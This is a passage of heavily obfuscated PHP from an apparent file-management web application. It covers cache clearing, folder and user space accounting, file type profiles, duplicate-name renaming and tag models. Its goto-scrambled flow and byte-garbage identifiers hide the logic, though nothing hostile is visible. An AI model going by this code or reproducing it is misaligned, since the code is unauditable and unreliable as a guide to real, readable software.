D´Ï«ì¾¨«: $FõŞà×è¾ = $this->where(array($bÅÉîõ¥—–[399] => $eÈË­ÇŞÑÏ))->find(); self::$cacheSourceInfo[$cÀİòä‹İ] = $FõŞà×è¾; return self::$cacheSourceInfo[$cÀİòä‹İ]; goto b¤ì¨ß¬Î; b¤ì¨ß¬Î: } public function sourceCacheClear($fÉÃÔÈë«µ = false) { self::cacheClear($fÉÃÔÈë«µ); } public static function cacheClear($f¯À¯¿Õ¥í = false) { $F‹Ÿ¡”ƒ³ =& $_SERVER[¾÷]; if ($f¯À¯¿Õ¥í == !1) { goto c±ë§œƒ; c±ë§œƒ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Aà†ó†—ÂÈ; Aà†ó†—ÂÈ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto EõÖÈ¬ëö; EõÖÈ¬ëö: return; goto d¹ñíÏÕßŠ; d¹ñíÏÕßŠ: } unset(self::$cacheSourceInfo[$F‹Ÿ¡”ƒ³[441] . $f¯À¯¿Õ¥í]); unset(self::$cachePathInfoMore[$f¯À¯¿Õ¥í]); unset(self::$cachePathInfo[$F‹Ÿ¡”ƒ³[1953] . $f¯À¯¿Õ¥í]); unset(self::$cachePathInfo[$F‹Ÿ¡”ƒ³[1954] . $f¯À¯¿Õ¥í]); } public function metaSet($c…§ê¯–ò, $CöŠ’Á¸ = null, $cˆˆÊ¦Ú¼ = null) { $FÕùÄÍ—©¼ = parent::metaSet($c…§ê¯–ò, $CöŠ’Á¸, $cˆˆÊ¦Ú¼); if ($FÕùÄÍ—©¼) { $this->sourceCacheClear($c…§ê¯–ò); } return $FÕùÄÍ—©¼; } public function pathInfoByPath($eéæî¢ÊÔ, $dĞ¢õ…­Ò§) { $f¤›šöÑÌÊ =& $_SERVER[¾÷]; $fŒ„îÌ…Î = !$dĞ¢õ…­Ò§ ? array() : explode($f¤›šöÑÌÊ[18], trim($dĞ¢õ…­Ò§, $f¤›šöÑÌÊ[18])); $fŸ¼†¾…¥¶ = $eéæî¢ÊÔ; foreach ($fŒ„îÌ…Î as $A¢ŞÏšÂÄ÷) { $A÷ÈÍÜÁ†‰ = array($f¤›šöÑÌÊ[481] => $fŸ¼†¾…¥¶, $f¤›šöÑÌÊ[38] => $A¢ŞÏšÂÄ÷); $d’§ìØì¤ = $this->where($A÷ÈÍÜÁ†‰)->select(); if (!$d’§ìØì¤) { return !1; } $d’§ìØì¤ = array_sort_by($d’§ìØì¤, $f¤›šöÑÌÊ[426]); $fŸ¼†¾…¥¶ = $d’§ìØì¤[0][$f¤›šöÑÌÊ[399]]; } return $this->pathInfo($fŸ¼†¾…¥¶, !0); } protected function updateModifyTime($eøÓˆñƒÑ¨) { goto fˆÀ‘©Š«”; CÓœÓ÷ğ: $this->where($B‰¿®ÍÜ‚–)->save($eÀ–®Ä»œ); goto fÏó›ì¿±ª; fˆÀ‘©Š«”: $f‡Ñàƒ‰àÁ =& $_SERVER[¾÷]; if (!$eøÓˆñƒÑ¨) { return; } if (!is_array($eøÓˆñƒÑ¨)) { $eøÓˆñƒÑ¨ = array($eøÓˆñƒÑ¨); } goto a»‰ˆ§¯²Š; a»‰ˆ§¯²Š: foreach ($eøÓˆñƒÑ¨ as $D¸›ŒîÅĞ¸ => $dƒ«ñöøì) { $eøÓˆñƒÑ¨[$D¸›ŒîÅĞ¸] = intval($dƒ«ñöøì); $this->sourceCacheClear($dƒ«ñöøì); } $B‰¿®ÍÜ‚– = array($f‡Ñàƒ‰àÁ[399] => array($f‡Ñàƒ‰àÁ[17], $eøÓˆñƒÑ¨)); $eÀ–®Ä»œ = array($f‡Ñàƒ‰àÁ[556] => USER_ID, $f‡Ñàƒ‰àÁ[420] => time()); goto CÓœÓ÷ğ; fÏó›ì¿±ª: } public function folderSizeReset($EÂ§¦¸Â …, $F÷„ÙÙ’ÚÓ = false) { goto e›¯­á; AÅ»¨êÖ‰‡: $A›¡ê„«ê = $c‹Æ«ÓÒÓÛ[1955] . $EÂ§¦¸Â …; CacheLock::lock($A›¡ê„«ê, 20); if ($F÷„ÙÙ’ÚÓ === !1) { $this->sourceCacheClear($EÂ§¦¸Â …); $B¦‹ÆĞİĞ = $this->sourceInfo($EÂ§¦¸Â …); $aÛÜª‹äÂ = array($c‹Æ«ÓÒÓÛ[398] => $EÂ§¦¸Â …, $c‹Æ«ÓÒÓÛ[425] => 0); $C˜ä‰›Ÿ³ñ = $this->where($aÛÜª‹äÂ)->sum($c‹Æ«ÓÒÓÛ[87]); $F÷„ÙÙ’ÚÓ = intval($C˜ä‰›Ÿ³ñ) - intval($B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[87]]); } goto AÃ¨˜˜Ï; dœ­ÏêóÄ¹: $this->where($aÛÜª‹äÂ)->setAdd($c‹Æ«ÓÒÓÛ[87], $F÷„ÙÙ’ÚÓ); CacheLock::unlock($A›¡ê„«ê); $Dìµˆ„‹à = $c‹Æ«ÓÒÓÛ[1956] . $B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[407]] . $c‹Æ«ÓÒÓÛ[14] . $B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[487]]; goto a‹·ö»Šøá; e›¯­á: $c‹Æ«ÓÒÓÛ =& $_SERVER[¾÷]; if ($this->statusIgnoreResetSpace) { return; } $B¦‹ÆĞİĞ = $this->sourceInfo($EÂ§¦¸Â …); goto AÅ»¨êÖ‰‡; Bº«Áê˜†Ì: $AŸÈ›”˜ÂĞ[] = $B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[399]]; $aÛÜª‹äÂ = array($c‹Æ«ÓÒÓÛ[399] => array($c‹Æ«ÓÒÓÛ[414], $AŸÈ›”˜ÂĞ)); if ($F÷„ÙÙ’ÚÓ < 0) { $aÛÜª‹äÂ[$c‹Æ«ÓÒÓÛ[87]] = array($c‹Æ«ÓÒÓÛ[949], abs($F÷„ÙÙ’ÚÓ)); } goto dœ­ÏêóÄ¹; a‹·ö»Šøá: $A˜ğ¹«èß = array($B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[407]], $B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[487]]); TaskRun::timeLimitCall($Dìµˆ„‹à, $c‹Æ«ÓÒÓÛ[1957], $A˜ğ¹«èß, 1.5); goto D®ˆÔĞ½¦; AÃ¨˜˜Ï: if ($F÷„ÙÙ’ÚÓ == 0) { return CacheLock::unlock($A›¡ê„«ê); } $AŸÈ›”˜ÂĞ = $this->parentLevelArray($B¦‹ÆĞİĞ[$c‹Æ«ÓÒÓÛ[490]]); if (!$AŸÈ›”˜ÂĞ) { $AŸÈ›”˜ÂĞ = array(); } goto Bº«Áê˜†Ì; D®ˆÔĞ½¦: } public function folderSizeResetChildren($e•Ÿåˆ¿œ‡) { goto dóã·Òš“; dóã·Òš“: $F¡ùìë­¨ß =& $_SERVER[¾÷]; $this->sourceCacheClear($e•Ÿåˆ¿œ‡); $bËµè´óµÓ = $this->sourceInfo($e•Ÿåˆ¿œ‡); goto Câùèà†; c‰™÷ ¤ƒì: $F‘ÈĞôÏ±Ñ[] = $bËµè´óµÓ; $F‘ÈĞôÏ±Ñ = array_to_keyvalue($F‘ÈĞôÏ±Ñ, $F¡ùìë­¨ß[399]); foreach ($F‘ÈĞôÏ±Ñ as $d‘ç¿®Šå => $AĞ÷ƒÙ) { $F‘ÈĞôÏ±Ñ[$d‘ç¿®Šå][$F¡ùìë­¨ß[1959]] = $F‘ÈĞôÏ±Ñ[$d‘ç¿®Šå][$F¡ùìë­¨ß[87]]; $F‘ÈĞôÏ±Ñ[$d‘ç¿®Šå][$F¡ùìë­¨ß[87]] = 0; } goto EÄ÷Ì¸ëì×; EÄ÷Ì¸ëì×: foreach ($AíÖ‰Áæ as $AĞ÷ƒÙ) { $CÚ’ÑŞ’õ = $AĞ÷ƒÙ[$F¡ùìë­¨ß[481]] . $F¡ùìë­¨ß[43]; if (!isset($F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ])) { continue; } if ($AĞ÷ƒÙ[$F¡ùìë­¨ß[426]] == $F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ][$F¡ùìë­¨ß[426]]) { $F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ][$F¡ùìë­¨ß[87]] += $AĞ÷ƒÙ[$F¡ùìë­¨ß[87]]; } } foreach ($F‘ÈĞôÏ±Ñ as $AĞ÷ƒÙ) { $A¾ùŸ„ä¨ˆ = $this->parentLevelArray($AĞ÷ƒÙ[$F¡ùìë­¨ß[490]]); foreach ($A¾ùŸ„ä¨ˆ as $CÚ’ÑŞ’õ) { $CÚ’ÑŞ’õ = $CÚ’ÑŞ’õ . $F¡ùìë­¨ß[43]; if (!isset($F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ])) { continue; } if ($AĞ÷ƒÙ[$F¡ùìë­¨ß[426]] == $F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ][$F¡ùìë­¨ß[426]]) { $F‘ÈĞôÏ±Ñ[$CÚ’ÑŞ’õ][$F¡ùìë­¨ß[87]] += $AĞ÷ƒÙ[$F¡ùìë­¨ß[87]]; } } } $cƒÔÔ¦ƒ‰› = array(); goto dÇùÂÅ…™; Câùèà†: $Bá«‹®®ê = array($F¡ùìë­¨ß[550] => 1, $F¡ùìë­¨ß[557] => array($F¡ùìë­¨ß[516], $bËµè´óµÓ[$F¡ùìë­¨ß[490]] . $e•Ÿåˆ¿œ‡ . $F¡ùìë­¨ß[517])); $f®¼–ƒÆŸ = $F¡ùìë­¨ß[1958]; $F‘ÈĞôÏ±Ñ = $this->field($f®¼–ƒÆŸ)->where($Bá«‹®®ê)->select(); goto eóŒÀÒ‚×­; eóŒÀÒ‚×­: $Bá«‹®®ê[$F¡ùìë­¨ß[406]] = 0; $AíÖ‰Áæ = $this->field($f®¼–ƒÆŸ)->where($Bá«‹®®ê)->select(); if (!$AíÖ‰Áæ) { return; } goto c‰™÷ ¤ƒì; dÇùÂÅ…™: foreach ($F‘ÈĞôÏ±Ñ as $AĞ÷ƒÙ) { if ($AĞ÷ƒÙ[$F¡ùìë­¨ß[87]] == $AĞ÷ƒÙ[$F¡ùìë­¨ß[1959]]) { continue; } $cƒÔÔ¦ƒ‰›[] = array($F¡ùìë­¨ß[399], $AĞ÷ƒÙ[$F¡ùìë­¨ß[399]], $F¡ùìë­¨ß[87], $AĞ÷ƒÙ[$F¡ùìë­¨ß[87]]); } $this->saveAll($cƒÔÔ¦ƒ‰›); goto AŸ‡´á¥¿; AŸ‡´á¥¿: } public function userSpaceReset($F¸î¸Ç = false) { $A– ¨êİÑ =& $_SERVER[¾÷]; $E·µò‡¹† = $this->where(array($A– ¨êİÑ[407] => self::TYPE_USER, $A– ¨êİÑ[487] => $F¸î¸Ç, $A– ¨êİÑ[406] => 0))->sum($A– ¨êİÑ[87]); $E·µò‡¹† = !$E·µò‡¹† || $E·µò‡¹† <= 0 ? 0 : $E·µò‡¹†; Model($A– ¨êİÑ[506])->userEdit($F¸î¸Ç, array($A– ¨êİÑ[1654] => $E·µò‡¹†)); } public function targetSpaceUpdate($a²”¨¼†, $E™š’Û¤ÖÖ) { $AÄ¼Üí¬ÙÔ =& $_SERVER[¾÷]; if (!$E™š’Û¤ÖÖ) { return; } if (!in_array($a²”¨¼†, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bë”½†Ÿ±‘ = $this->targetSpaceSize($a²”¨¼†, $E™š’Û¤ÖÖ); if ($a²”¨¼† == self::TYPE_USER) { Model($AÄ¼Üí¬ÙÔ[506])->userEdit($E™š’Û¤ÖÖ, array($AÄ¼Üí¬ÙÔ[1654] => $bë”½†Ÿ±‘)); } else { if ($a²”¨¼† == self::TYPE_GROUP) { Model($AÄ¼Üí¬ÙÔ[489])->groupEdit($E™š’Û¤ÖÖ, array($AÄ¼Üí¬ÙÔ[1654] => $bë”½†Ÿ±‘)); } } } public function targetSpaceSize($F¶ÓŠ”¢›«, $FÂ°¿’±ßá) { goto D±é¸‘¬¨; D±é¸‘¬¨: $DÒ¶Á²“¢ô =& $_SERVER[¾÷]; $dµîˆóÎ = $this->sourceRoot($F¶ÓŠ”¢›«, $FÂ°¿’±ßá, !0); if (!$dµîˆóÎ) { return 0; } goto E›¹†¹ŞØ†; bÍ¦ÅÓÀé: $F©İœâšÁ = array_to_keyvalue($F©İœâšÁ, $DÒ¶Á²“¢ô[43], $DÒ¶Á²“¢ô[399]); $F©İœâšÁ = array_unique(array_filter($F©İœâšÁ)); if ($F©İœâšÁ) { $fĞ‘ó’§ Ñ = array($DÒ¶Á²“¢ô[413] => array($DÒ¶Á²“¢ô[414], $F©İœâšÁ)); $b‘³¤„‹ôØ += floatval($this->where($fĞ‘ó’§ Ñ)->sum($DÒ¶Á²“¢ô[87])); } goto fí©¦‡¢Å´; fí©¦‡¢Å´: $b‘³¤„‹ôØ = !$b‘³¤„‹ôØ || $b‘³¤„‹ôØ <= 0 ? 0 : $b‘³¤„‹ôØ; return $b‘³¤„‹ôØ; goto E¡¤ó¬À‚; E›¹†¹ŞØ†: $b‘³¤„‹ôØ = floatval($dµîˆóÎ[$DÒ¶Á²“¢ô[87]]); $fĞ‘ó’§ Ñ = array($DÒ¶Á²“¢ô[557] => array($DÒ¶Á²“¢ô[516], $DÒ¶Á²“¢ô[502] . $dµîˆóÎ[$DÒ¶Á²“¢ô[399]] . $DÒ¶Á²“¢ô[517])); $F©İœâšÁ = Model($DÒ¶Á²“¢ô[424])->field($DÒ¶Á²“¢ô[413])->where($fĞ‘ó’§ Ñ)->select(); goto bÍ¦ÅÓÀé; E¡¤ó¬À‚: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($AÔïç à÷–) { return $this->fileTypeProfile($AÔïç à÷–, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E¾¶±¼ïÌô) { return $this->fileTypeProfile($E¾¶±¼ïÌô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($dµ‘Ş®„­, $c’‰‡‘áë) { goto EïËÕèÆàé; eƒ‘‘Ü¿: $aéâ£¡âÉ‰ = array(); $aéâ£¡âÉ‰[$e™Êè÷ù¤®[1961]] = array($e™Êè÷ù¤®[1962] => LNG($e™Êè÷ù¤®[1961]), $e™Êè÷ù¤®[1963] => $this->where($fÀ½¬†êùå)->count(), $e™Êè÷ù¤®[552] => $this->where($fÀ½¬†êùå)->sum($e™Êè÷ù¤®[87])); $fõ ‡¦¡ºÇ = KodIO::fileTypeList(); goto CËì±‘ÛŒœ; DİíÓˆ©¸ñ: if ($dÛ±…âí) { return $dÛ±…âí; } $fÀ½¬†êùå = array($e™Êè÷ù¤®[550] => 0); if ($dµ‘Ş®„­ != !1) { $fÀ½¬†êùå[$e™Êè÷ù¤®[487]] = $dµ‘Ş®„­; $fÀ½¬†êùå[$e™Êè÷ù¤®[407]] = $c’‰‡‘áë; } goto eƒ‘‘Ü¿; EïËÕèÆàé: $e™Êè÷ù¤® =& $_SERVER[¾÷]; $C×­½ğŠ” = $e™Êè÷ù¤®[1960] . $dµ‘Ş®„­ . $e™Êè÷ù¤®[80] . $c’‰‡‘áë; $dÛ±…âí = Cache::get($C×­½ğŠ”); goto DİíÓˆ©¸ñ; CËì±‘ÛŒœ: foreach ($fõ ‡¦¡ºÇ as $cÙ‚Æó¨® => $Bæ†¾Ù°”İ) { $fÀ½¬†êùå[$e™Êè÷ù¤®[408]] = $this->fileTypeWhere($cÙ‚Æó¨®); $aéâ£¡âÉ‰[$cÙ‚Æó¨®] = array($e™Êè÷ù¤®[1962] => $Bæ†¾Ù°”İ[$e™Êè÷ù¤®[38]], $e™Êè÷ù¤®[1963] => $this->where($fÀ½¬†êùå)->count(), $e™Êè÷ù¤®[552] => $this->where($fÀ½¬†êùå)->sum($e™Êè÷ù¤®[87])); } Cache::set($C×­½ğŠ”, $aéâ£¡âÉ‰, 1200); return $aéâ£¡âÉ‰; goto AšÌ‚ğÀĞ; AšÌ‚ğÀĞ: } public function fileNameExist($eùŸÂ¶¿™, $B’á™…ÇÅ) { $D®É‰Æ±Ó™ =& $_SERVER[¾÷]; $CÓ¢‡“¡£ = $this->childList($eùŸÂ¶¿™); foreach ($CÓ¢‡“¡£ as $Fíå…ØÓ´ß) { if ($Fíå…ØÓ´ß[$D®É‰Æ±Ó™[38]] == $B’á™…ÇÅ) { return $Fíå…ØÓ´ß[$D®É‰Æ±Ó™[399]]; } if (strtolower($Fíå…ØÓ´ß[$D®É‰Æ±Ó™[38]]) == strtolower($B’á™…ÇÅ)) { return $Fíå…ØÓ´ß[$D®É‰Æ±Ó™[399]]; } } return !1; } public function childList($Fğ‡™œ³Ñæ) { goto c§ËÉ šøÍ; EéŸÒ¡Ø®Ã: self::$cacheChildList[$e ¹Ó¹Ÿ·°] = $aŸ¡Õ¯Â Ü; foreach ($aŸ¡Õ¯Â Ü as $eâŞ•¡½º·) { $e ¹Ó¹Ÿ·° = $d·é‹œÖğñ[441] . $eâŞ•¡½º·[$d·é‹œÖğñ[399]]; self::$cacheSourceInfo[$e ¹Ó¹Ÿ·°] = $eâŞ•¡½º·; } return $aŸ¡Õ¯Â Ü; goto ašÕ¨Ûš²Ç; BìÕ¥ • : $eåôç£ù¢ï = array($d·é‹œÖğñ[481] => intval($Fğ‡™œ³Ñæ), $d·é‹œÖğñ[426] => 0); $aŸ¡Õ¯Â Ü = $this->where($eåôç£ù¢ï)->select(); $aŸ¡Õ¯Â Ü = $aŸ¡Õ¯Â Ü ? $aŸ¡Õ¯Â Ü : array(); goto EéŸÒ¡Ø®Ã; c§ËÉ šøÍ: $d·é‹œÖğñ =& $_SERVER[¾÷]; $e ¹Ó¹Ÿ·° = $d·é‹œÖğñ[1938] . $Fğ‡™œ³Ñæ; if (isset(self::$cacheChildList[$e ¹Ó¹Ÿ·°])) { return self::$cacheChildList[$e ¹Ó¹Ÿ·°]; } goto BìÕ¥ • ; ašÕ¨Ûš²Ç: } public function fileNameAuto($fŒ™ ‘Üï§, $A»±ÈëçÁ, $Bõ„¦‚…ëğ = REPEAT_RENAME, $fÜÕ‰ëÎÆ = false) { $bÉºêÔ¬ÃÆ =& $_SERVER[¾÷]; $A¦Œ×’ñø¯ = $this->childList($fŒ™ ‘Üï§); $D¢·Š‹ä = array_to_keyvalue($A¦Œ×’ñø¯, $bÉºêÔ¬ÃÆ[43], $bÉºêÔ¬ÃÆ[38]); return $this->fileNameAutoGet($D¢·Š‹ä, $A»±ÈëçÁ, $Bõ„¦‚…ëğ, $fÜÕ‰ëÎÆ); } public function fileNameAutoGet($Böë×·Ã¯±, $E¢»£ê«¤, $f—Ä©Ğ‰‰„, $c³İÙì‘Ñ) { $bÈéæÙ†ºô =& $_SERVER[¾÷]; if ($f—Ä©Ğ‰‰„ == REPEAT_REPLACE || !$Böë×·Ã¯± || !in_array_not_case($E¢»£ê«¤, $Böë×·Ã¯±) || $c³İÙì‘Ñ && $f—Ä©Ğ‰‰„ != REPEAT_RENAME_FOLDER) { return $E¢»£ê«¤; } if ($f—Ä©Ğ‰‰„ == REPEAT_SKIP) { return !1; } $CÉ †õÑƒô = $bÈéæÙ†ºô[104] . get_path_ext($E¢»£ê«¤); $CÉ †õÑƒô = $CÉ †õÑƒô == $bÈéæÙ†ºô[104] || $c³İÙì‘Ñ ? $bÈéæÙ†ºô[43] : $CÉ †õÑƒô; for ($E«œƒÊãìƒ = 1; $E«œƒÊãìƒ <= count($Böë×·Ã¯±) + 1; $E«œƒÊãìƒ++) { $Cæ©¥âºÅš = substr($E¢»£ê«¤, 0, strlen($E¢»£ê«¤) - strlen($CÉ †õÑƒô)); $eŠË§…†£˜ = $Cæ©¥âºÅš . "\x28{$E«œƒÊãìƒ}\x29{$CÉ †õÑƒô}"; if (!in_array_not_case($eŠË§…†£˜, $Böë×·Ã¯±)) { return $eŠË§…†£˜; } } } } goto bƒõæ¯‚Ê; f¡«øì””¸: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\157\160\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($F²¨ƒÏÑ„¢) { $fòŒºœÜ‡Š =& $_SERVER[¾÷]; if (!defined($fòŒºœÜ‡Š[457])) { define($fòŒºœÜ‡Š[457], 0); } return "\x55\163\x65\x72\x4f\x70\x74\151\157\156\137{$F²¨ƒÏÑ„¢}\137" . USER_ID; } protected function filterWhere($cğ•ôœ«òô) { $aÂÁêÄâ Ã =& $_SERVER[¾÷]; if (!defined($aÂÁêÄâ Ã[457])) { define($aÂÁêÄâ Ã[457], 0); } $cğ•ôœ«òô[$aÂÁêÄâ Ã[1505]] = USER_ID; return $cğ•ôœ«òô; } public function cacheRemoveUser($D¬Ã‡Çˆ®ê, $Aä»à‹Öİ) { return Cache::remove("\x55\x73\145\162\117\x70\x74\x69\x6f\x6e\137{$D¬Ã‡Çˆ®ê}\137" . $Aä»à‹Öİ); } protected function optionDefault($B¶ŸèÉ³„ì = '') { $Aè‘Ç¦ç÷ =& $_SERVER[¾÷]; if ($B¶ŸèÉ³„ì == $Aè‘Ç¦ç÷[43]) { return $GLOBALS[$Aè‘Ç¦ç÷[16]][$Aè‘Ç¦ç÷[2134]]; } if ($B¶ŸèÉ³„ì == $Aè‘Ç¦ç÷[2135]) { return $GLOBALS[$Aè‘Ç¦ç÷[16]][$Aè‘Ç¦ç÷[2136]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\141\147\114\x69\163\x74"; public $modelType = "\125\163\145\x72\x4f\160\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\163\164\x79\154\x65", "\x73\157\x72\164"); public function listData($bŒÙŸà«¾« = false, $d»²†ÉöÌ = "\163\x6f\162\164", $d’è¸‘ÖÂ = false) { return parent::listData($bŒÙŸà«¾«, $d»²†ÉöÌ, $d’è¸‘ÖÂ); } public function remove($AøŒî–òµ) { return parent::remove($AøŒî–òµ); } public function add($b›À‘‚øŞÀ, $dÎ±¾¦»Ğ = "\154\141\142\x65\154\x2d\x67\x72\x65\171\55\x6e\x6f\x72\x6d\x61\x6c") { $a½Ô„£´÷Ç =& $_SERVER[¾÷]; if ($this->findByName($b›À‘‚øŞÀ)) { return !1; } $c­îÚ´Ó… = array($a½Ô„£´÷Ç[416] => $b›À‘‚øŞÀ, $a½Ô„£´÷Ç[467] => $dÎ±¾¦»Ğ, $a½Ô„£´÷Ç[1672] => $this->getSort($a½Ô„£´÷Ç[263]) + 1); return parent::insert($c­îÚ´Ó…); } public function update($F¼Ìß—·©å, $Eˆ­ŸøÜ¦) { $F«¨ÏÇùÍ« =& $_SERVER[¾÷]; $C¢õ¸™ÍÁÃ = $this->listData($F¼Ìß—·©å); $C¼Çƒ¢®¯Ô = $this->findByName($Eˆ­ŸøÜ¦[$F«¨ÏÇùÍ«[38]]); if (!$C¢õ¸™ÍÁÃ || $C¼Çƒ¢®¯Ô && $C¼Çƒ¢®¯Ô[$F«¨ÏÇùÍ«[397]] != $C¢õ¸™ÍÁÃ[$F«¨ÏÇùÍ«[397]]) { return !1; } return parent::update($F¼Ìß—·©å, $Eˆ­ŸøÜ¦); } public function moveTop($FŞÏ©ÒÙãŠ) { $B¢›Êóñãñ =& $_SERVER[¾÷]; $DßÒò«Íæ± = parent::listData(); $DÀ‚½™ÀŸï = $this->getSort($B¢›Êóñãñ[262]); foreach ($DßÒò«Íæ± as &$f§áÈ†áŠ) { if ($f§áÈ†áŠ[$B¢›Êóñãñ[397]] == $FŞÏ©ÒÙãŠ) { $f§áÈ†áŠ[$B¢›Êóñãñ[1691]] = $DÀ‚½™ÀŸï; continue; } $f§áÈ†áŠ[$B¢›Êóñãñ[1691]] += 1; } unset($f§áÈ†áŠ); return parent::resetData($DßÒò«Íæ±); } public function moveBottom($BØ†ç¬™æ±) { $fŠà®–Û½¾ =& $_SERVER[¾÷]; $fÚÂÛÓŒ¿Í = $this->getSort($fŠà®–Û½¾[263]) + 1; return parent::update($BØ†ç¬™æ±, array($fŠà®–Û½¾[1691] => $fÚÂÛÓŒ¿Í)); } public function resetSort($F”­÷ã®Şë) { goto B¿˜´¢Äƒê; B¿˜´¢Äƒê: $Fœî¬Ğö« =& $_SERVER[¾÷]; $f¡‘š²¸ß = array(); $F”­÷ã®Şë = is_array($F”­÷ã®Şë) ? $F”­÷ã®Şë : array(); goto A±ŞÄ»; A±ŞÄ»: for ($aÆí‰ª¼‰¼ = 0; $aÆí‰ª¼‰¼ < count($F”­÷ã®Şë); $aÆí‰ª¼‰¼++) { $f¡‘š²¸ß[$F”­÷ã®Şë[$aÆí‰ª¼‰¼] . $Fœî¬Ğö«[43]] = $aÆí‰ª¼‰¼ + 1; } $d‰‹³­Ó¿¯ = parent::listData(); foreach ($d‰‹³­Ó¿¯ as &$EØ¤˜ä•„») { $BĞÙƒØµÚ® = $f¡‘š²¸ß[$EØ¤˜ä•„»[$Fœî¬Ğö«[397]]]; $EØ¤˜ä•„»[$Fœî¬Ğö«[1691]] = $BĞÙƒØµÚ® ? $BĞÙƒØµÚ® : $EØ¤˜ä•„»[$Fœî¬Ğö«[1691]]; } goto DáŸºñÙŠ; DáŸºñÙŠ: unset($EØ¤˜ä•„»); return parent::resetData($d‰‹³­Ó¿¯); goto B„èö»ìâÅ; B„èö»ìâÅ: } private function getSort($f–—÷øÜ¿Ø) { $DĞˆÓ‹……ç =& $_SERVER[¾÷]; $EíÔÔ­®Ÿ‹ = parent::listData(); $Fˆ¥ø¹Ì÷ = array_to_keyvalue($EíÔÔ­®Ÿ‹, $DĞˆÓ‹……ç[43], $DĞˆÓ‹……ç[1691]); if (!$Fˆ¥ø¹Ì÷) { $Fˆ¥ø¹Ì÷ = array(0); } $c‡ø¤âÛÛ„ = $f–—÷øÜ¿Ø == $DĞˆÓ‹……ç[263] ? max($Fˆ¥ø¹Ì÷) : min($Fˆ¥ø¹Ì÷); return intval($c‡ø¤âÛÛ„); } } goto cË§ì÷±¡Ó; FÉù¥ø±ºŞ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($Fç¿È“Ÿˆ) { $bÂ§àİ†Øœ =& $_SERVER[¾÷]; return array($bÂ§àİ†Øœ[1769] => array($Fç¿È“Ÿˆ[0], $bÂ§àİ†Øœ[1770]), $bÂ§àİ†Øœ[1771] => array($Fç¿È“Ÿˆ[0], $bÂ§àİ†Øœ[1772])); } protected function get($fÕ•” “—) { $dóå”­¼‘Ù =& $_SERVER[¾÷]; $Eº†ŞÅ¤Óñ = Model($dóå”­¼‘Ù[489])->metaGet($fÕ•” “—, $dóå”­¼‘Ù[1773]); $Dõ¾Æá”Öí = json_decode($Eº†ŞÅ¤Óñ, !0); return $Dõ¾Æá”Öí ? $Dõ¾Æá”Öí : array($dóå”­¼‘Ù[1774] => $dóå”­¼‘Ù[96], $dóå”­¼‘Ù[374] => array()); } protected function set($cî››ŒÈÌ‡, $b­ Í“§·†) { $f„½”†×© =& $_SERVER[¾÷]; $b­ Í“§·† = $b­ Í“§·† ? $b­ Í“§·† : array($f„½”†×©[1774] => $f„½”†×©[96], $f„½”†×©[374] => array()); Model($f„½”†×©[489])->metaSet($cî››ŒÈÌ‡, $f„½”†×©[1773], json_encode($b­ Í“§·†)); return Model($f„½”†×©[489])->metaSet($cî››ŒÈÌ‡, $f„½”†×©[1773], json_encode($b­ Í“§·†)); } protected function getByTagID($a–¹ÍÂ¢Ïœ, $e¬‰ªìùëÓ) { goto C©ÜœÀÊ»Æ; C©ÜœÀÊ»Æ: $A²ï–¡¹İˆ =& $_SERVER[¾÷]; if (!$a–¹ÍÂ¢Ïœ || !$e¬‰ªìùëÓ) { return !1; } if (!Model($A²ï–¡¹İˆ[489])->getInfoSimple($a–¹ÍÂ¢Ïœ)) { return !1; } goto Cï¸Ì¼; dêğğÅÌ‚¸: return is_array($AÚåèŞ†”) ? $AÚåèŞ†” : !1; goto eÙÒƒ¤®ß×; Cï¸Ì¼: $A•³˜¢Í¢ = $this->get($a–¹ÍÂ¢Ïœ); if (!$A•³˜¢Í¢ || !isset($A•³˜¢Í¢[$A²ï–¡¹İˆ[374]])) { return !1; } $AÚåèŞ†” = array_find_by_field($A•³˜¢Í¢[$A²ï–¡¹İˆ[374]], $A²ï–¡¹İˆ[397], $e¬‰ªìùëÓ); goto dêğğÅÌ‚¸; eÙÒƒ¤®ß×: } public function listSource($C„ù¿‡ß¾…, $B³‡áœÀ¬») { goto Eùà‘¡“Ö´; BÓùØ„„™Ç: if (!$aòñ¥¼ƒ³ || count($cÂ»µªæ÷ˆ) == $aòñ¥¼ƒ³[$f±çßó÷¢œ[371]][$f±çßó÷¢œ[372]]) { return $aòñ¥¼ƒ³; } $A©Ó‡É§Ò† = array(); $fÂ°„“–Ûí = array_to_keyvalue($aòñ¥¼ƒ³[$f±çßó÷¢œ[84]], $f±çßó÷¢œ[43], $f±çßó÷¢œ[399]); goto eíÌ¬Ãİ‹À; Eùà‘¡“Ö´: $f±çßó÷¢œ =& $_SERVER[¾÷]; if ($B³‡áœÀ¬» && !is_array($B³‡áœÀ¬»)) { $B³‡áœÀ¬» = array($B³‡áœÀ¬»); } $b¦Ôˆ©•Œ„ = $this->listData($C„ù¿‡ß¾…); goto cŠƒ·×ö—; eíÌ¬Ãİ‹À: $DÆğ«ÉÎ¶ = array_to_keyvalue($aòñ¥¼ƒ³[$f±çßó÷¢œ[83]], $f±çßó÷¢œ[43], $f±çßó÷¢œ[399]); $c‚·¾Øä‡É = array_merge($DÆğ«ÉÎ¶, 